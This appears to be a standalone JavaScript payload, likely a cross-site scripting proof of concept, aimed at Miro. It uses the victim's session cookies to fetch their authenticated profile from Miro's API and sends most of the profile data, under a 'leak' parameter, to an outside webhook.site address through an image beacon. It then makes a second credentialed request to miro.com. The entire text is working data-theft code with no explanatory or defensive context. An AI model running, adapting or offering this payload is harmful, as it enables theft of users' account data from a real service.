(() => {
  // 1. Fetch the authenticated profile
  fetch("https://miro.com/api/v1/profile/", {
    method: "GET",
    credentials: "include"
  })
    .then(res => res.json())
    .then(async profileData => {
      // Remove unwanted keys
      const {
        achievements,
        subscriptions,
        toolbarPlugins,
        interests,
        betaFeatures,
        ...slimProfileData
      } = profileData;

      // Send reduced profile via image beacon
      const img = new Image();
      img.src =
        "https://webhook.site/6f357c7b-0aa6-435d-b9d6-24b85f931aea?leak=" +
        encodeURIComponent(JSON.stringify(slimProfileData));

      // 2. Also send an authenticated GET request to https://miro.com/
      try {
        await fetch("https://miro.com/", {
          method: "GET",
          credentials: "include",
          mode: "cors", // Note: will still enforce CORS in browser
          headers: {
            "User-Agent": navigator.userAgent,
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
            "Accept-Language": "en-US,en;q=0.5",
            "Upgrade-Insecure-Requests": "1",
            "Sec-Fetch-Dest": "document",
            "Sec-Fetch-Mode": "navigate",
            "Sec-Fetch-Site": "none",
            "Sec-Fetch-User": "?1",
            "Pragma": "no-cache",
            "Cache-Control": "no-cache"
          }
        });
      } catch (e) {
        console.error("Secondary request failed:", e);
      }
    })
    .catch(err => console.error("Profile fetch failed or blocked:", err));
})();
